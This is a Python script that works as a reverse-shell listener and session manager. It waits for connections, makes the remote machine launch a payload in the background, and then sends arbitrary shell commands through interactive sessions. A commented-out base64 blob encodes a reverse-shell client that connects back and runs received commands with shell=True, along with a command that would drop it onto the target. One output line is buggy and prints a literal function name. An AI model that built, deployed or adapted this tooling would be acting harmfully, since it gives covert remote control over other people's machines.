#!/usr/bin/python3

from nethelper import ServerSocket, pretty, netshell_loop
from threading import Thread
import logging
import socket
import time
import sys
import cmd


logging.basicConfig(level=logging.INFO)

def listen(line, py_state):
    if not line:
        host, port = ("localhost", 4242)
    else:
        host, port = line.strip().split(" ")

    sock = ServerSocket()

    try:
        sock.server_socket.bind((host, int(port)))
    except socket.error:
        logging.error("Address already in use")
        return
    
    logging.info(f"Started listener on {host, port}")

    try:
        sock.listen()
        if not sock.is_shell(py_state):
            logging.error("No shell found")
            return
    except KeyboardInterrupt:
        sock.server_socket.close()
        print("")
        return
    except BrokenPipeError:
        sock.server_socket.close()
        logging.error("BrokenPipeError")
        return

    return sock

class NetShell(cmd.Cmd):
    def __init__(self, server):
        super(NetShell, self).__init__()
        self.prompt = "net_shell > "
        self.server = server
        self.id = None
        self.output = None
        self.is_open = True
        self.is_loop = True
        self.shell_active = True

        Thread(target=self._is_alive).start()

    def precmd(self, line):
        """Hook method executed just before the command line is
        interpreted, but after the input prompt is generated and issued.
        """
        if not self.is_open:
            raise BrokenPipeError
        return line
    
    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished."""

        return stop

    """
        <--CMD library ends here-->
    """

    def _is_alive(self):
        """ Checks if socket is alive
            https://stackoverflow.com/questions/48024720/python-how-to-check-if-socket-is-still-connected
        """
        while self.is_loop:
            try:
                data = self.server.client_socket.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
                if len(data) == 0:
                    raise OSError
            except BlockingIOError:
                continue
            except OSError as e:
                logging.error(f"Session {self.id +1}: BrokenPipeError")
                self.is_open = False
                self.server.client_socket.close()
                self.server.server_socket.close()
                break
            except Exception:
                logging.error("unexpected exception when checking if a socket is closed")
                break

            time.sleep(1)

    """
        <--Commands start here-->
    """

    def do_ls(self, line):
        if not line:
            pwd = pretty(self.server.send_command("pwd"))
            ls = pretty(self.server.send_command("ls -la"))
        else:
            old_path = pretty(self.server.send_command("pwd"))
            cd = pretty(self.server.send_command(f"cd {line}"))
            if "no such file or directory" in cd.lower():
                logging.error("No such file or directory")
                return
            pwd = pretty(self.server.send_command("pwd"))
            ls = pretty(self.server.send_command(f"ls -la"))
            self.server.send_command(f"cd {old_path}".strip())

        sys.stdout.write(f"{pwd}\n{'=' * (len(pwd))}\n\n{ls}\n\n")

    def do_run(self, line):
        self.output = self.server.send_command(line, wt_output=False)
        if self.output:
            sys.stdout.write(f"prettify_output(self.output)\n")

    def do_exit(self, line):
        logging.info(f"Closing connection from session {self.id +1}")

        self.is_loop = False
        self.server.client_socket.close()
        self.server.server_socket.close()
        return True

class LocalShell(cmd.Cmd):
    def __init__(self):
        super(LocalShell, self).__init__()
        self.prompt = "local_shell > "
        self.sessions = []
        self.currentSession = None
        if len(sys.argv) > 1 and sys.argv[1] == "-l":
            self.do_listen(None)
        
    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.
        """
        return None

    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished.
        """

        return stop

    """
        <--Commands start here-->
    """

    def do_listen(self, line):
        sock = listen(line, 0)

        if not sock:
            return
        
        logging.info(f"Sending payload..")
        # encoded_data = "aW1wb3J0IHRpbWUKaW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKZGVmIGNvbm5lY3RfdG9faG9zdChob3N0LCBwb3J0KToKICAgIGZvciBpIGluIHJhbmdlKDUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgcy5jb25uZWN0KChob3N0LCBwb3J0KSkKICAgICAgICAgICAgcmV0dXJuIHMKICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgICAgICBwcmludChmIkF0dGVtcHQge2krMX06IENvbm5lY3Rpb24gZmFpbGVkLiBSZXRyeWluZy4uLiIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkgICMgd2FpdCBmb3IgNSBzZWNvbmRzIGJlZm9yZSByZXRyeWluZwogICAgcHJpbnQoIkNvdWxkIG5vdCBlc3RhYmxpc2ggY29ubmVjdGlvbi4gRXhpdGluZy4uLiIpCiAgICBleGl0KCkKCmRlZiBleGVjdXRlX2NvbW1hbmQocyk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGRhdGEgPSBzLnJlY3YoMTAyNCkKICAgICAgICBwcmludChkYXRhKQogICAgICAgIGlmIGRhdGEuZGVjb2RlKCJ1dGYtOCIpID09ICdxdWl0JzoKICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YS5kZWNvZGUoInV0Zi04IiksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkKICAgICAgICBzdGRvdXRfdmFsdWUgPSBwcm9jLnN0ZG91dC5yZWFkKCkgKyBwcm9jLnN0ZGVyci5yZWFkKCkKICAgICAgICBzLnNlbmQoc3Rkb3V0X3ZhbHVlKQoKZGVmIG1haW4oKToKICAgIGhvc3QgPSAnbG9jYWxob3N0JwogICAgcG9ydCA9IDQyNDIKICAgIHMgPSBjb25uZWN0X3RvX2hvc3QoaG9zdCwgcG9ydCkKICAgIGV4ZWN1dGVfY29tbWFuZChzKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQ=="
        # sock.client_socket.send(f"echo -n {encoded_data} | base64 --decode > payload.py".encode())
        sock.client_socket.send("setsid sh -c 'sleep 5 && python3 /home/pi/opt/testfolder/payload.py > test.txt'".encode())
        sock.server_socket.close()
        sock.client_socket.close()

        sock = listen(line, 1)
        # sock.client_socket.send(b"test\n")

        # print(pyclient)

        self.currentSession = NetShell(sock)

        self.sessions.append(self.currentSession)
        self.currentSession.id = (len(self.sessions) - 1)
        logging.info(f"Session {self.currentSession.id + 1} created")
        netshell_loop(self.currentSession)
    
    def do_sessions(self, line):
        args = line.split(" ")
        if args and "-i" in args[0]:
            try:
                index = int(args[1])
            except ValueError:
                logging.error("Index must be int")
                return
            if index:
                if index > len(self.sessions):
                    logging.error("Sesssion not found")
                    return
            netshell_loop(self.sessions[index -1])
            return

        for netShell in self.sessions:
            # TODO: Format this
            sys.stdout.write(f"Session {netShell.id +1} | IP address {netShell.server.client_address[0]} "
                            f"| Port {netShell.server.server_socket.getsockname()[1]} | Open: {netShell.is_open}\n")
        sys.stdout.write("\n")

    def do_exit(self, line):
        logging.info("Exiting...")

        for netShell in self.sessions:
            if netShell.is_open:
                netShell.is_loop = False
                netShell.server.client_socket.close()
                netShell.server.server_socket.close()

        sys.exit()


def _local_loop(localShell):
    try:
        localShell.cmdloop()
    except KeyboardInterrupt:
        print("")
        _local_loop(localShell)

def main():
    _local_loop(LocalShell())


if __name__ == "__main__":
    main()